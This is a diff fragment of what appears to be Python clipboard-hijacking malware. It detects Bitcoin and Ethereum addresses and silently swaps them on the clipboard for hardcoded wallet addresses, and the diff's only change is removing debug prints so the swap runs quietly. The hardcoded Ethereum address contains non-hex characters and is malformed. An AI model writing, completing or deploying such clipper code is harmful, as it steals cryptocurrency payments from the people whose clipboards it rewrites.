@@ -16,26 +16,20 @@ async def btc_address(value):
         if value[0] == '1':
             my_address = '1EfxR9dZVQDEs61fcCKMADYpNi2suQ3roR'
             new_value = pyperclip.copy(my_address)
-            print(new_value)
-
+            
         elif  value[0] == '3':
             my_address = '1EfxR9dZVQDEs61fcCKMADYpNi2suQ3roR'
             new_value = pyperclip.copy(my_address)
-            print(new_value)
-
+            
         elif  value[0] == 'b':
             my_address = 'bc1q4x74lttkp04xstlkhrxczf9lrhn0mmteg50yyg'
             new_value = pyperclip.copy(my_address)
-            print(new_value)
-
+            
     elif eth != None:
         my_address = '0xc7d688cb053c19ad5ee4f48c3z48958880534j49r'
         new_value = pyperclip.copy(my_address)
-        print(new_value)
-
-    print (btc)
-    print(eth)
         
+      
 
 async def wait4update(value):
     while True:
